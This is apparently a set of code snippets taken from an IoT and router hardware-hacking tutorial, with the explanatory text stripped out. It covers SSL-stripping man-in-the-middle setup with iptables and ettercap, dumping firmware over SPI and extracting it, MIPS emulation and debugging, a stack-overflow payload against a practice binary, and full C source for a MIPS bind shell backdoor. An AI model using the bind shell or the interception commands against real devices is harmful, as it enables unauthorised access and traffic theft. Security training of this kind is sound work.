["```\napt-get install flashrom  \n```", "```\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n```", "```\niptables -t nat -p tcp -A PREROUTING --dport 80 -j REDIRECT --to-port 10000\n\n```", "```\nssltrip -a\n\n```", "```\nettercap -G\n\n```", "```\n$ flashrom -p ft2232_spi:type=232H -r spidump.bin \n\n```", "```\ngit clone https://github.com/devttys0/binwalk.git\n\n```", "```\nbinwalk -e [firmware-name]\n\n```", "```\ngit clone https://github.com/craigz28/firmwalker.git\n```", "```\n./firmwalker.sh ~/lab/firmware/dlink/r2/v2/_2K-mdm-image-mdm9625.yaffs2.extracted/yaffs-root\n\n```", "```\ngit clone --recursive https://github.com/attify/firmware-analysis-toolkit.git\ncd firmware-analysis-toolkit && sudo ./setup.sh\n\n```", "```\nsudo apt install gdb-multiarch \n# Installing GEF \nsudo pip3 install capstone unicorn keystone-engine\nwget -q -O- https://github.com/hugsy/gef/raw/master/gef.sh | sh  \n```", "```\n>> readelf -h pwnable/Intro/stack_bof_01\nELF Header:\nMagic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00\nClass:                             ELF32\nData:                              2's complement, little endian\nVersion:                           1 (current)\nOS/ABI:                            UNIX - System V\nABI Version:                       0\nType:                              EXEC (Executable file)\nMachine:                           MIPS R3000\nVersion:                           0x1\nEntry point address:               0x400630\nStart of program headers:          52 (bytes into file)\nStart of section headers:          3900 (bytes into file)\nFlags:                             0x50001007, noreorder, pic,       \ncpic, o32, mips32\nSize of this header:               52 (bytes)\nSize of program headers:           32 (bytes)\nNumber of program headers:         6\nSize of section headers:           40 (bytes)\nNumber of section headers:         29\nSection header string table index: 26\n```", "```\ncp $(which qemu-mipsel-static) .\n\n```", "```\nSudo chroot . ./qemu-mipsel-static pwnable/Intro/stack_bof1  \n```", "```\nsudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof1\n```", "```\ntarget remote 127.0.0.1:1234  \n```", "```\nsudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 \"$(python -c \"print 'A'*204 +  '\\x5c\\x09\\x40'\")\"  \n```", "```\n./extract-firmware.sh Dlink_firmware.bin  \n```", "```\n#include <stdio.h> \n#include <stdlib.h> \n#include <string.h> \n#include <sys/types.h> \n#include <sys/socket.h> \n#include <netinet/in.h> \n\n#define SERVER_PORT  9999 \n /* CC-BY: Osanda Malith Jayathissa (@OsandaMalith) \n  * Bind Shell using Fork for my TP-Link mr3020 router running busybox \n  * Arch : MIPS \n  * mips-linux-gnu-gcc mybindshell.c -o mybindshell -static -EB -march=24kc \n  */ \nint main() { \n   int serverfd, clientfd, server_pid, i = 0; \n   char *banner = \"[~] Welcome to @OsandaMalith's Bind Shell\\n\"; \n   char *args[] = { \"/bin/busybox\", \"sh\", (char *) 0 }; \n   struct sockaddr_in server, client; \n   socklen_t len; \n\n   server.sin_family = AF_INET; \n   server.sin_port = htons(SERVER_PORT); \n   server.sin_addr.s_addr = INADDR_ANY; \n\n   serverfd = socket(AF_INET, SOCK_STREAM, 0); \n   bind(serverfd, (struct sockaddr *)&server, sizeof(server)); \n   listen(serverfd, 1); \n\n    while (1) { \n         len = sizeof(struct sockaddr); \n         clientfd = accept(serverfd, (struct sockaddr *)&client, &len); \n        server_pid = fork(); \n        if (server_pid) { \n         write(clientfd, banner,  strlen(banner)); \n           for(; i <3 /*u*/; i++) dup2(clientfd, i); \n           execve(\"/bin/busybox\", args, (char *) 0); \n           close(clientfd); \n         } close(clientfd); \n    } return 0; \n} \n```", "```\n./mipsel-buildroot-linux-uclibc-gcc bindshell.c -static -o bindshell  \n```"]